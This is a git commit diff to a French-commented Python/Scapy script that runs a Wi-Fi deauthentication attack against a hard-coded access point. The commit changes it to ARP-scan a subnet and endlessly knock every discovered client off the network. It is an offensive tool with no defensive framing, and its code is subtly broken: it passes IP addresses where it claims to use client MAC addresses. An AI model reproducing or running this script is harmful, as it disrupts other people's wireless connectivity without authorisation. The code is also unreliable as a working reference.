841a1cc48c545a88d92f15d605f5d0d65f8b0501
FoXhack1 <fox.pclyc@gmail.com>
2024-10-22 15:56:54 +0200

    Update wifi (1).py

--- wifi (1).py
+++ wifi (1).py
@@ -1,24 +1,32 @@
 from scapy.all import *
+import os
+import time
 
 # Définition des variables
 interface = "wlan1"  # interface réseau à utiliser
 bssid = "08:36:C9:98:11:A9"  # adresse MAC de l'AP cible
-client = "9E:9D:0B:E7:FD:78"  # adresse MAC du client cible
-channel = 11  # canal Wi-Fi à utiliser
 
 # Fonction pour changer le canal
 def set_channel(channel):
-    # Utilisation de la commande iwconfig pour changer le canal
     os.system(f"iwconfig {interface} channel {channel}")
 
 # Fonction pour envoyer des paquets de déconnexion
-def deauth(bssid, client):
+def deauth(client, bssid):
     packet = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
     send(packet, iface=interface, verbose=0)
 
-# Changer le canal
-set_channel(channel)
+# Changer le canal à 11 (ou tout autre canal de l'AP)
+set_channel(11)
 
-# Envoi de paquets de déconnexion en boucle
+# Boucle pour déauthentifier tous les clients
 while True:
-    deauth(bssid, client)
+    # Scanner pour les clients connectés
+    clients = ARP(pdst=f"192.168.1.0/24")  # Remplacez par le bon sous-réseau
+    ans, _ = sr(clients, timeout=2, verbose=0)
+
+    for _, rcv in ans:
+        client_mac = rcv.psrc  # adresse MAC du client
+        print(f"Déauthentification de {client_mac}")
+        deauth(client_mac, bssid)  # Envoi de paquets de déauthentification
+
+    time.sleep(1)  # Attendre 1 seconde avant de renvoyer des paquets
